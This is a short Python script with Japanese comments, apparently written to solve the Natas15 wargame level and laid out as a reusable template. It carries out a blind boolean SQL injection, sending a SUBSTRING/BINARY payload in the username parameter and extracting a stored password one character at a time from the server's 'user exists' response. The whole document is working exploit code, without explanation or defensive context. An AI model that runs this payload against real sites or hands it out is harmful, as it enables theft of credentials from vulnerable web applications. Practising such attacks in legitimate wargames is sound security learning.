import requests
import string

url = "http://example.com/test.php"  # ここにurl


charset = string.ascii_letters + string.digits  # パスワードに使われそうな文字集合
extracted_password = ""
max_password_length = 32  # 適宜変更
error_string = "This user exists." # エラー文字列をここに

auth_user = "natas15"               # Basic認証用のユーザ名
auth_pass = "yourpassword"          # Basic認証用のパスワード

use_auth = bool(auth_user and auth_pass)

for i in range(1, max_password_length + 1):
    found = False
    for c in charset:
        payload = f'admin" AND SUBSTRING(password, {i}, 1) = BINARY "{c}" -- '
        params={"username": payload} #適宜変更

        if use_auth:
            response = requests.get(url, params=params, auth=(auth_user, auth_pass))
        else:
            response = requests.get(url, params=params)
            
        if error_string in response.text:
            extracted_password += c
            print(f"[+] Found character {i}: {c} -> {extracted_password}")
            found = True
            break
    if not found:
        print(f"[-] No character found at position {i}. Ending search.")
        break

print(f"[✓] Extracted password: {extracted_password}")
